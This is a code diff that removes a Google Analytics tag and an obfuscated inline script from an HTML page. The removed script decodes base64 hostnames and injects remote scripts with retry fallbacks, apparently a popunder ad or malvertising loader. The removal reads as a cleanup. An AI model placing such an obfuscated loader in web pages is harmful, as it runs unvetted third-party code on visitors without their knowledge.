@@ -29,22 +29,6 @@
 
   </head>
 
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-YZ8V3HXD2E"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-YZ8V3HXD2E');
-</script>
-
-<script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var w=window,q="b7d9851ea6b541a0126bee1f6516205d",s=[["siteId",384-576+443+132+5155167],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],v=["d3d3LnZpc2FyaW9tZWRpYS5jb20vVkJoL3F0ZXh0aWxlLm1pbi5qcw==","ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvU0FPdmdUL016SWRWQi9vcmFjdGl2ZS5taW4uY3Nz"],i=-1,f,n,r=function(){clearTimeout(n);i++;if(v[i]&&!(1765896754000<(new Date).getTime()&&1<i)){f=w.document.createElement("script");f.type="text/javascript";f.async=!0;var x=w.document.getElementsByTagName("script")[0];f.src="https://"+atob(v[i]);f.crossOrigin="anonymous";f.onerror=r;f.onload=function(){clearTimeout(n);w[q.slice(0,16)+q.slice(0,16)]||r()};n=setTimeout(r,5E3);x.parentNode.insertBefore(f,x)}};if(!w[q]){try{Object.freeze(w[q]=s)}catch(e){}r()}})();
-/*]]>/* */
-</script>
-  
   <body>
     <section class="hero">
       <div class="hero__bg__image__container">
